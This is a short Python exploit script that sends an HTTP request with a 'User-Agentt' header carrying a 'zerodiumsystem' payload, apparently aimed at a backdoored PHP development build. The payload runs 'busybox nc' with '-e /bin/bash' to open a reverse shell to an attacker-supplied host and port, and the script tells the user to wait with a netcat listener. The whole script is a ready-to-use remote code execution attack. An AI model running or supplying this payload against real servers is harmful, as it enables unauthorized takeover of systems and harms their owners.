#!/usr/bin/env python3
import requests
import sys


if len(sys.argv) < 4:
    print("Usage is python3 <url> <LHOST> <LPORT>")
    sys.exit(1)

base_url = sys.argv[1]
LHOST = sys.argv[2]
LPORT = sys.argv[3]

print(f"[+]Payload sent. make sure u are listenning port on {LPORT} with nc")

headers = {"User-Agentt": f"zerodiumsystem('busybox nc {LHOST} {LPORT} -e /bin/bash');"}

response = requests.get(base_url, headers=headers)

print(response.text)
